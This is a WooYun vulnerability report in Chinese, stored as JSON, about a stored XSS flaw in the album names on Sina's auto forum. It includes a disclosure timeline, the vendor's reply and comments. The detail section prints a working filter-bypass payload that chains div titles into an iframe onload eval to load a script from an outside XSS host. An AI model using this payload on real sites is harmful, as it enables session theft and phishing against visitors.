{"id": 8852, "wybug_id": "wooyun-2013-036047", "wybug_title": "新浪某分站存储型xss漏洞", "wybug_corp": "新浪", "wybug_author": "suolong", "wybug_date": "2013-09-04 08:39", "wybug_open_date": "2013-10-19 08:39", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-09-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-10-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-10-19：\t细节向公众公开  简要描述： xss存储型，但是新浪做了httponly了吧。但是做个钓鱼绝对不是问题。 黑名单的过滤，还是过滤的少了侥幸绕过。  详细说明：  问题站点： 新浪汽车汽车论坛  url:http://bbs.auto.sina.com.cn问题页面是 论坛有个人中心，里面的相册，创建相册\n\n这里简单测试下html标签，过滤了 <img> <script>标签 \n\n但是没有过滤 <a>标签 ,<IFRAME>标签，<div>标签等，可以说明新浪用的是黑名单，只是把危险的标签过滤了。   漏洞证明：  alert \n\n没完，这之后我就悲剧了，我不知道sina的cookie不能用好吧。 然后构造<iframe> 执行语句， 字节长度做了限制这里是数据库存储长度所决定的哈，做了个字节尺，\n<if><if><if><if><if><if><if><if><if><if><if><if><if><if><if><if>\n好吧 直接上我的绕过语句 \n<div id=\"X\" title=\"(function()\"><div id=\"E\" title=\"{var s=document.createElement('script');\"></div><div id=\"Y\" title=\"s.src='http://xss.tw/xxxx';\"></div><div id=\"Z\" title=\"document.body.appendChild(s)})()\"></div><iframe onload=eval(X.title+E.title+Y.title+Z.title)></iframe>\n这里说下利用场景 因为字节限制，所以需要构造xss执行语句，所以上面的执行语句每句话是一个相册名字，很壮观吧。完事后 \n\n所有访问我的相册列表人就会执行xss ，同样的问题 相片描述也存在类似问题。xss 来了\n\n额 cookie不能用 囧rz。。。。     修复方案：  在过滤写标签吧，这里的输入应该用不到标签的，把页面搞乱也不好看哈。   版权声明：转载请注明来源 suolong@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2013-09-04 09:12 厂商回复： 感谢关注新浪安全，已安排人员进行修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-04 10:41 |    \t\tqiaoy \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:16        )\t\t \n  利用方法好猥琐，赞！    \n     2013-10-08 13:52 |    \t\t承诺 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 你关注的漏洞 发表了白帽子)\t\t \n  利用方法好猥琐，赞！    \n     2013-10-19 11:53 |    \t\t墨水心_Len \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:15        | PKAV技术宅 | 每一个有文化的东西，我们都...)\t\t \n  没有登录来观摩下的，看了后忍不住登录来说 思路很赞！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}